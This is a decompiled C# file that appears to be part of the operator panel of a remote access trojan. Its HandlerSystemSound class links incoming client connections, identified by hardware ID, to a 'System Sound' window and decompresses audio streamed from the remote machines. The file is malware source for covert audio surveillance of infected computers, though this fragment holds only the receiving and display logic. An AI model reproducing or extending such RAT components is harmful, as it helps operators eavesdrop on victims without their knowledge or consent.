using System;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000066 RID: 102
	internal class HandlerSystemSound
	{
		// Token: 0x06000203 RID: 515 RVA: 0x00020FE0 File Offset: 0x0001F1E0
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Sound"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				((FormSystemSound)client.Tag).Buffer(HandlerSystemSound.Decompress((byte[])objects[2]));
				return;
			}
			else
			{
				FormSystemSound form = (FormSystemSound)Application.OpenForms["SystemSound:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "System Sound [" + (string)objects[2] + "]";
					form.client = client;
					form.trackBar1.Enabled = true;
					form.materialSwitch1.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}

		// Token: 0x06000204 RID: 516 RVA: 0x000210F0 File Offset: 0x0001F2F0
		private static byte[] Decompress(byte[] inputBytes)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream(inputBytes))
			{
				using (MemoryStream memoryStream2 = new MemoryStream())
				{
					using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
					{
						deflateStream.CopyTo(memoryStream2);
					}
					result = memoryStream2.ToArray();
				}
			}
			return result;
		}
	}
}
